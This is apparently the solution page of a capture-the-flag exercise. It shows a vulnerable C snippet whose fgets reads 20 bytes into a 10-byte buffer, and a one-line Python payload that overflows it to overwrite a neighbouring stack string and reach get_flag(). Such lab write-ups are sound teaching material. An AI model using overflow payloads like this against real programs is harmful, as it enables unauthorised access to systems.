---
nav_order: 1
parent: 'Task: Indirect Business'
---

# Solution

Use the buffer overflow to overwrite a string on the stack.
This is going to be copied to a global variable that is checked before calling the `get_flag()` function.

Check the code from ./buff-ovf with GDB:
```
    char local_buff[10];
    char message[10];

    fgets(message, 20, stdin);
    strcpy(buff, local_buff);
```
By analysing the code we can see that string "message" is 10 bytes long, but we are reading 20 bytes from stdin. By overflowing the buffer we can overwrite the "local_buff" variable with a string. 

```sh
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*10 + b"Bye")' | ./buff-ovf
```
